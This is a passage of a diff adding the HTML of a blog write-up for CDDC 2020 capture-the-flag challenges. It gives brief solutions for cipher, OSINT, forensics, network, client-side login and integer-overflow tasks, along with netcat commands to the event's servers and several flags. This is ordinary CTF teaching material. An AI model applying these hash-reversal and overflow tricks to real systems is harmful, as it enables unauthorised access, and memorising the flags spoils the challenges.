+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;No Time&quot;
+        title=&quot;&quot;
+        src=&quot;/static/No_Time-b3dfb6613c5606d903a970fa986425e9-48538.png&quot;
+        srcset=&quot;/static/No_Time-b3dfb6613c5606d903a970fa986425e9-bed0f.png 200w,
+/static/No_Time-b3dfb6613c5606d903a970fa986425e9-5fd34.png 400w,
+/static/No_Time-b3dfb6613c5606d903a970fa986425e9-48538.png 800w,
+/static/No_Time-b3dfb6613c5606d903a970fa986425e9-b70ec.png 1200w,
+/static/No_Time-b3dfb6613c5606d903a970fa986425e9-d134a.png 1600w,
+/static/No_Time-b3dfb6613c5606d903a970fa986425e9-fdcf4.png 1917w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    
+
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/No_Time_2-b2329717e47dd4e3fdbdee952b2ff8a4-584ae.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 735px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 17.551020408163264%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAr0lEQVQY011Q7Q6DIBDz/d9wy7LoWMyciiAcB7ikO3RzHz+aNvToNVdZO6IfDOoroe0cjDGYRg1PHpQIPhIofpgTI6Sw6n8uXsVlMARYH+FIhjlgshNmmkHsMc4avenhgkOI4jm9BsQcf8AvrtKSUJAfG+IS4SVI9QpHdcCpPePSNahvDdRdYbDDHpJy2rlkrA3Ltg28M2eGlYZa2hhvRFsYklOIJmlZ/O8/7zOU9yfxmjRwsFR1zAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;No Time Source Code&quot;
+        title=&quot;&quot;
+        src=&quot;/static/No_Time_2-b2329717e47dd4e3fdbdee952b2ff8a4-584ae.png&quot;
+        srcset=&quot;/static/No_Time_2-b2329717e47dd4e3fdbdee952b2ff8a4-408a5.png 200w,
+/static/No_Time_2-b2329717e47dd4e3fdbdee952b2ff8a4-66145.png 400w,
+/static/No_Time_2-b2329717e47dd4e3fdbdee952b2ff8a4-584ae.png 735w&quot;
+        sizes=&quot;(max-width: 735px) 100vw, 735px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;We were given a website that has a countdown, viewing the page source and the flag was in a comment&lt;/p&gt;
+&lt;h3&gt;[Crypto-1] My Best Friend, Julius!&lt;/h3&gt;
+&lt;p&gt;JHLZHY&lt;em&gt;ZLSSZ&lt;/em&gt;ZLHZOLSSZ&lt;em&gt;IF&lt;/em&gt;AOL_ZLHZOVYL&lt;/p&gt;
+&lt;p&gt;Flag: CAESAR&lt;em&gt;SELLS&lt;/em&gt;SEASHELLS&lt;em&gt;BY&lt;/em&gt;THE_SEASHORE&lt;/p&gt;
+&lt;p&gt;Gaius &lt;strong&gt;Julius&lt;/strong&gt; Caesar. Probably a caesar shift cipher, use &lt;a href=&quot;https://cryptii.com/pipes/caesar-cipher&quot;&gt;cryptii caesar&lt;/a&gt; to decrypt it.&lt;/p&gt;
+&lt;h3&gt;[OSINT-1] Better Alternative Than TV&lt;/h3&gt;
+&lt;p&gt;Google “UnduplicitousCorp” result in a Youtube Channel. Flag was found at about channel page.&lt;/p&gt;
+&lt;h3&gt;[Web-2] VulnLogin&lt;/h3&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Vuln_Login-dc1593442fe5a09f0db6477884040a04-c8f4b.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 773px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 105.04527813712808%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAVCAYAAABG1c6oAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAEhElEQVQ4y2WU6W8VVRiH73/gBz9rgpAYiKJV3ECUGFFZAkoIRbaGJaIoGJYiRggIgQKWTVnbYumFC7W0tMYIkiBRSYGWYqQsCYa4UFHovXNnPTN35i6P78y01oQPT86Z9z3nN+8553dOIqMb9KNbBrY7gCOUii6UXBxPYmogp1QWw+xF0zWypoWjFI7jkNAMQ4Kx2K3fLM53KDq6hEtx23014MoVP+p3XlZ0XXYl59B5yab9vClzdCzHwnNdXFeR0E0Ty7Tx/CxtbR4fLIKVK0qsWFaicnmJpUuED4t9xLEwF45Z8j6cOqVkronrKNExSDiOjXJc8gWTk205li8ssWZZkdVLi6xaXKR6Q4GeP+D3W7B5bSGKhblwTOWiEqe/dfoEHYysRsIVQd/LUShanGrxWDmvyLrFBdYtKbCiIs8vF0Xsz25u91yl/QxUzs3HeWHVgiJnTypygRUJWnqWRM5z8ZRsPA7ftwZ8PCvPhveEd/N8UhHQUgN37vzNXz13Ofp5idUVcS7Kz8nT/p1PCYWybUw5oETg56IlF0sWZ5o81pTnqVoQsHFezPo5AaktcLiKqN8f3zQ/YO2MPOe+cQkKViSobIuELxW6UYWKs40en04J2Frhs3mWT9UMn50LA2oqfeo+8tnxTkDVTJ8ts322zvFZPzWg/WsXPzBxRNBTYpvAE//YiiI2P6RcNk6SibNybJ8ZUz09x7a3Y6rL4+/+2KbJPhdaZQ/zZlShY5vhHobrjwV/bFB8NjHHgbnCvLjdNS3Hzqnefeya5rF1fI4LzXLKgTEg6EqZ/YI/1TtsG+uxv9xjz5SY3W8Kk+9nz1su22VsR5Md7aEtt8W2RDA0oyPGzmNxrtZm96suydku9eXCdJd944UJfYwfYP9El11jXC4flz0UD2uZLHroQ03LoGu6CJqcP2Cz9yVFaoaITVLUT1bUjVPUjFXUvia83tcKdW8o9oxSXEpZWF6Ge3fTZDIZuXpiRks3KUiFF/fZ1Ix0aJquSI5zODzBoW60zcHRKqJ2lPTHOBx82eHLVxwOPOvQdUQsk5fHJa0RaiVC7yjLwcegc69FzeM2h16waXhRxIdbdOzwydxWaD0u5zbkqCuzSMpPQurKbLpTSoztyT2WSv+/hzkR7PrCon6oxdGRFqnnLRqeNDk9X/Hzfjvi5GxFQ5lJ6rk4f+gxi+4GubolM9o2w9DjJRuaIf/Q6dppkBxi8tUIk2MysfEpkyNDJTZYqnpE+sPiWJR7Wr4fNblSJwUF2YEla5o8kBkdVRLBap1jgwxaygyanzA4PtzgxDMGraN02oSWEXEszDXLmMYhBldrRTCvo/ULZsJTFsGcnHLXxizHHtBpHiQ8rHP8IZ0TQ3RahwlDRXBwHA9pkTGND+p079YjwfS9DGFxkWBWEw/ZGrc7NW4m5eVuNLiZyvLrUZ0bSY3rDRo3hGsNGa4nY64l01yv1/inW8e0s6TToaDYJvROKNrbm8ZwNDx5ddyCIegEcntUuBy3l6wrPlO9/6GpNHoug6V0MbQIZmIf/gudsXHsI5tiDwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Vuln Login Page&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Vuln_Login-dc1593442fe5a09f0db6477884040a04-c8f4b.png&quot;
+        srcset=&quot;/static/Vuln_Login-dc1593442fe5a09f0db6477884040a04-16cef.png 200w,
+/static/Vuln_Login-dc1593442fe5a09f0db6477884040a04-94028.png 400w,
+/static/Vuln_Login-dc1593442fe5a09f0db6477884040a04-c8f4b.png 773w&quot;
+        sizes=&quot;(max-width: 773px) 100vw, 773px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    
+
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Vuln_Login_2-b0bf81bf27ff5ea7301a566419a14faa-ea7b7.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 743px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 26.244952893674295%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA3ElEQVQY03WQa07DMBCEcxa/48SPxI6pKxCCAg2NUqnc/y6D6xSEBPz4NN61NbvjRpkBIe/x/JThY4JPGWOIGMKIGCNCQSkFQggopRXyB193jVAtHuYVjy8H7F8XHM8fmM8XvC0r1uWE9/kI03fgQoJLBc45lBC/kAXGGBrOBdyUEfM90uBw5w12o8OunPO41clbpGkq204YrIHvNaxuYbsNVzCdrsOqYe8DjLVwWqFvFXSJKMpE+iMKo2SjbEEIrV+wKf2ua2QpZX10dedVWdVrrxpVLbAbt95/fAIGPZY15uxl2QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Vuln Login Function&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Vuln_Login_2-b0bf81bf27ff5ea7301a566419a14faa-ea7b7.png&quot;
+        srcset=&quot;/static/Vuln_Login_2-b0bf81bf27ff5ea7301a566419a14faa-1874b.png 200w,
+/static/Vuln_Login_2-b0bf81bf27ff5ea7301a566419a14faa-003b2.png 400w,
+/static/Vuln_Login_2-b0bf81bf27ff5ea7301a566419a14faa-ea7b7.png 743w&quot;
+        sizes=&quot;(max-width: 743px) 100vw, 743px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Login code was client sided at js/login.js. The code seems to use md5, finding the reverse lookup of the hashes and obtain the username and password
+flag format is CDDC20{username_password}&lt;/p&gt;
+&lt;h3&gt;[Misc-1] Welcome to CDDC 2020&lt;/h3&gt;
+&lt;p&gt;Flag can be found in the slack text channel&lt;/p&gt;
+&lt;h3&gt;[OSINT-2] Fun with File Extensions&lt;/h3&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/OSINT2-85991fa756fbf6ff79d308c7ed0070a2-4550a.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 519px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 33.52601156069364%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABu0lEQVQoz0WQ224SURiF513KPYm0Agm1JgQC2MqZyrEcrBgbpViuuNOmGhP7GvYNTGpsOUMbSoFh0ERpOdREsfoMn3vGVC++rH/W2vn3mi315D7KpyHXv38xuhghKwNm367+Mb2aMZ5OmF//5Pv8B/2BzOVkzGQ21Xx1vhhfCp2IfI5ULBYpFApkMhne7u/zZfSV5zs7pNNpcts5bVbJZrPEEwkGQ4V3BweEI2Etz+fzQrd5srXFw81NpGAwhMvlwrC4SCqZ5LzXx+F0YbfZ8Pv9+Hw+PB6P8Jzo9XpaJ6e8ev2G20tLrK3d1/LQ+jpOhwOb3S4WhoIEAgF0CwtEY3E+HB1ry00mE0lxQTqVIiW4u7KCTqfj/eEhL17usrx8h/jGBtFIhMfZR8RiMR6Ew0gJ8RvRaBSz2czTZzmaooHaxmKx4Ha78Xp9Ai9WqxWj0Uil3mB3b49bBoPmu0V7j8fLvdVVHKKlVGu0UKk3W5x1uijDzzSaJ9TqTeqqr+VNqmJRpdagrww5bXc4KlcoVWuUa3VKguNKlY+lMlKnL3MuD/4jvrtC/6JoeuOrZ9vijc8E6qxqu9vT9IY/fxF7lCZ2Ei0AAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;OSINT-2 PDF File&quot;
+        title=&quot;&quot;
+        src=&quot;/static/OSINT2-85991fa756fbf6ff79d308c7ed0070a2-4550a.png&quot;
+        srcset=&quot;/static/OSINT2-85991fa756fbf6ff79d308c7ed0070a2-0755b.png 200w,
+/static/OSINT2-85991fa756fbf6ff79d308c7ed0070a2-4a009.png 400w,
+/static/OSINT2-85991fa756fbf6ff79d308c7ed0070a2-4550a.png 519w&quot;
+        sizes=&quot;(max-width: 519px) 100vw, 519px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Download Organisation_Chart.pdf found in the website. Opening this pdf file in photoshop allow you to extract the flag image.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/OSINT2Flag-3876765a2baa4befc551f6b6f7153648-36e31.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 264px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 10.984848484848484%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsSAAALEgHS3X78AAAAXUlEQVQI1z1NWw7AIAjb/Y+0xKm81A/PxKAu+2gKpS2XzOldNCBOas42ghXImc187Q1OrbFA17WcRJFpxOjI20VhrCFUIgiJ3J/ejyke8Rh/IH1ZgiI53ruUL8v+AqaJg3OMgVWcAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;OSINT-2 Flag&quot;
+        title=&quot;&quot;
+        src=&quot;/static/OSINT2Flag-3876765a2baa4befc551f6b6f7153648-36e31.png&quot;
+        srcset=&quot;/static/OSINT2Flag-3876765a2baa4befc551f6b6f7153648-63fb1.png 200w,
+/static/OSINT2Flag-3876765a2baa4befc551f6b6f7153648-36e31.png 264w&quot;
+        sizes=&quot;(max-width: 264px) 100vw, 264px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;h3&gt;[Forensics-1] Can’t See A Thing&lt;/h3&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/img-4bdba9f047cb651b3645cfe6a41666ba-163b3.jpg&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 177.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAkABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAEF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAABwAEFIUAEB//EABQQAQAAAAAAAAAAAAAAAAAAADD/2gAIAQEAAQUCf//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8BX//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8BX//EABQQAQAAAAAAAAAAAAAAAAAAADD/2gAIAQEABj8Cf//EABQQAQAAAAAAAAAAAAAAAAAAADD/2gAIAQEAAT8hf//aAAwDAQACAAMAAAAQAMEAA8//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAEDAQE/EF//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAECAQE/EF//xAAUEAEAAAAAAAAAAAAAAAAAAAAw/9oACAEBAAE/EH//2Q==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;img&quot;
+        title=&quot;&quot;
+        src=&quot;/static/img-4bdba9f047cb651b3645cfe6a41666ba-78f2b.jpg&quot;
+        srcset=&quot;/static/img-4bdba9f047cb651b3645cfe6a41666ba-dce19.jpg 200w,
+/static/img-4bdba9f047cb651b3645cfe6a41666ba-c1413.jpg 400w,
+/static/img-4bdba9f047cb651b3645cfe6a41666ba-78f2b.jpg 800w,
+/static/img-4bdba9f047cb651b3645cfe6a41666ba-ab4c4.jpg 1200w,
+/static/img-4bdba9f047cb651b3645cfe6a41666ba-bc99b.jpg 1600w,
+/static/img-4bdba9f047cb651b3645cfe6a41666ba-34a60.jpg 2400w,
+/static/img-4bdba9f047cb651b3645cfe6a41666ba-163b3.jpg 2592w&quot;
+        sizes=&quot;(max-width: 800px) 100vw, 800px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Flag can be found in the comment metadata of the image. Can be view by right clicking img.jpg &gt; Properties &gt; Details &gt; Comments. Mirror the text to obtain the flag.&lt;/p&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/Forensics-1_Flag-b612b84282e61a6c1a47e21163ea8ef1-3cbf6.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 357px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 78.71148459383754%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAC5klEQVQ4y5VUS2sTURSeVZdWGpqfIQguXPon/AEibgWxoWBiq6V26cJuBVeKogsVXIhWXFiFitjYJp00aZNJJpNMZjKvZN4z+Tz35kFtu/HAx7lz5uY7j+9MhEtXr+HiwiIyCxlkF7OYvzCPbDaLTCYDQRD+C3NzcxDy91dwL1/A+vo61tbWUCgU8GB1Ffl8HrlcDktLS9yfBIudh+XlZQi61oMoViA1W+h0FIgHFWiaBtMwILc7cIdDVA+rkOUWms0mqtUa+n0DzEaj0QzM0jSF4DgOv2DZDmyCrvfpbMP3fXieh8FgSHEbpmlxGIbJn1l8jAHHNCbEcQxFUVCrVqD21FkmFmeeJRQPRAyGLq8kSRIO9j5mnhBFEeqNBlzXhRCGAVwvQL1lQpINtFUXQZSAdZGmI44wjJBO2jpt6SSJKIo8ucDYez0Nimpj6CXomz5lTWdzCYIAaleFwds1qG2TZt2lrjqwLJvfYdWWSuUxIXuQWy0cVg7Bqp3alND3XH65tF/C8XGdRKmiXD7A7u4ffg7D8WhYbEYoSS38Lu6h1zeREE9EFUZ0iFm7UQyNhJLbChesrYw9E9IwDQQ0Dtby/v4+bN4yEVpdGXqzxuo6Z0oJnH4PCIdIopAnODPPUYp6vcHVFpDGeLUj487LMjZ/WHj0RcODzxoeElY+6Xj8tYunWyKebbegOuGUgYNVViER+24Cd+Bg6HpEGId48ctA4aOOja0ebr/r4MbrNm6+UXCLcP15G5efSLiy2UDug4oNSri+pZHX8X7PwG5dR9uOMbAtIqS1CcIQaRSgq1hwbO9MwzstH3ffSqjrHn7KPrYbLr4TvjU8VLoudHPAV4stPd9DrrLc5kr2NJ03w8RIJtConYRUPN8SKH2HhBzRCp0glBoSX4larcY/wZPfqUm7yURgqk8RMk85/CCEpJr0HrD+rVBGsVjE0VGd/xHYpNaEFR790vIT2KcRUNyLYbjROPGE8C9q+GURQdno2QAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Forensics 1 Flag&quot;
+        title=&quot;&quot;
+        src=&quot;/static/Forensics-1_Flag-b612b84282e61a6c1a47e21163ea8ef1-3cbf6.png&quot;
+        srcset=&quot;/static/Forensics-1_Flag-b612b84282e61a6c1a47e21163ea8ef1-fa148.png 200w,
+/static/Forensics-1_Flag-b612b84282e61a6c1a47e21163ea8ef1-3cbf6.png 357w&quot;
+        sizes=&quot;(max-width: 357px) 100vw, 357px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{pho70gr4phy_i5_aw3sOmE}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;[Pwn (Linux)-1] nc&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;nc&lt;/span&gt; nc.chall.cddc2020.nshc.sg &lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;netcat to given domain and port&lt;/p&gt;
+&lt;h3&gt;[Crypto-2] Cryptic Message&lt;/h3&gt;
+&lt;p&gt;hq hm kbq jipoox yhnnhatoq qb abkmqjtaq p mijhim bn hknijikaim, ipaS yidikyikq tdbk hqm djIyiaimmbJ pky ipas mhcdoi hk hqmion. hn, pnqij ybhkg mb, bkI mhcdox rkbarm btq poo qsi aikQjpo hknijikaim pky djimikqm bki’m ptyhikai vhqs qsi mqpjqhkg-dbhkq pky qsi abkaoTmhbk, bki cpx dJbytai p mqpjqohKg, qsbtgs dbmmhlox p cijiqjhahbtM, inniaq.&lt;/p&gt;
+&lt;p&gt;My teammate Ethan found out that the ciphertext was encrypted with a substitution  cipher. Use &lt;a href=&quot;https://quipqiup.com/&quot;&gt;Automated substitution cipher solver&lt;/a&gt; and group all capitalized letters to obtain flag.&lt;/p&gt;
+&lt;h3&gt;[Network-1] Baby Shark&lt;/h3&gt;
+&lt;p&gt;Viewing the pcap in wireshark show us a bunch of HTTP traffic including images. Export objects and flag is found in one of the images.&lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{TLP_RED_EYES_ONLY}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;[Network-2] Mama Shark&lt;/h3&gt;
+&lt;p&gt;Also similar to the previous network challenge. Extracting the HTTP object and the flag can be found in a text file.&lt;/p&gt;
+&lt;p&gt;Flag: &lt;code class=&quot;language-text&quot;&gt;CDDC20{JUST_GIVE_ME_TL:DR}&lt;/code&gt;&lt;/p&gt;
+&lt;h3&gt;[Forensics-2] Shell History&lt;/h3&gt;
+&lt;p&gt;Download the virtual machine and run the machine. The flag can be found in the .bashhistory in user home directory.&lt;/p&gt;
+&lt;h3&gt;[Pwn (Linux)-2] (2^31)-1&lt;/h3&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;
+      &lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;nc&lt;/span&gt; zer0.chall.cddc2020.nshc.sg &lt;span class=&quot;token number&quot;&gt;20002&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+      &lt;/div&gt;
+&lt;p&gt;My teammate Ethan mutiple 2^31-1 by 2 and able to get the program to print out 0 which results in the flag. &lt;/p&gt;
+&lt;h3&gt;[Misc-2] ARGH&lt;/h3&gt;
+&lt;p&gt;Key: GZ2gXZ3bD2qqNyNxXb5LJ8HfHQtTL5VHA
+Execute the binary and feed the key&lt;/p&gt;
+&lt;h3&gt;[Crypto-3] Iffy Glyphs&lt;/h3&gt;
+&lt;p&gt;
+  &lt;a
+    class=&quot;gatsby-resp-image-link&quot;
+    href=&quot;/static/what_is_this-7e50efc4fdaa62b906823f1fee457491-34bb7.png&quot;
+    style=&quot;display: block&quot;
+    target=&quot;_blank&quot;
+    rel=&quot;noopener&quot;
+  &gt;
+  
+  &lt;span
+    class=&quot;gatsby-resp-image-wrapper&quot;
+    style=&quot;position: relative; display: block; ; max-width: 390px; margin-left: auto; margin-right: auto;&quot;
+  &gt;
+    &lt;span
+      class=&quot;gatsby-resp-image-background-image&quot;
+      style=&quot;padding-bottom: 36.92307692307692%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABJ0AAASdAHeZh94AAABcklEQVQozy2R11LCYBCF8/4v4I2jzogKYxlAkAktoSS00Jt0QigJ3Xp73N3x6v/nbDnf7ip7p4RxJ4HfQxP9egzTXgr2QMOHW0WnGsVuURRtPc1L3mKgw50bcIYZ0Vk7bSwMmirV6VDWk5wUrugt6AFpmozeYNhSUSsEpWA5zqJqvGDSTcJIPWDUjiOXvJeacu5J4rp6K+bK17YuNFu7gJ1TxPeujuUoi/2yhM3MwM++IYlMeCBttyhI7LiuYEt/1rnOm5s4kaY4owwSkWsJmGm/uOqqT8jyRNMohWAR3aidEOo6Uc9oVINymbSSf5Zm2cQd5u8aFN4Dj3J2LfRqb4K/GOpiwGaseUTPE8z7admTTYWzfgpn2h1rnNeltfEdlE+vhlY5LIdghw01YhNuwhq7d6wIDqsyNUkL1fH/z3l8JM825eVVKS7tKRP3CVkseCmjqq9XktQshYWwUQzJaEzCozUJwNQC0iT8eCGmpuYXoz9XJeCOVETeLQAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
+    &gt;
+      &lt;img
+        class=&quot;gatsby-resp-image-image&quot;
+        style=&quot;width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px transparent;&quot;
+        alt=&quot;Dancing Men Cipher&quot;
+        title=&quot;&quot;
+        src=&quot;/static/what_is_this-7e50efc4fdaa62b906823f1fee457491-34bb7.png&quot;
+        srcset=&quot;/static/what_is_this-7e50efc4fdaa62b906823f1fee457491-91183.png 200w,
+/static/what_is_this-7e50efc4fdaa62b906823f1fee457491-34bb7.png 390w&quot;
+        sizes=&quot;(max-width: 390px) 100vw, 390px&quot;
+      /&gt;
+    &lt;/span&gt;
+  &lt;/span&gt;
+  
+  &lt;/a&gt;
+    &lt;/p&gt;
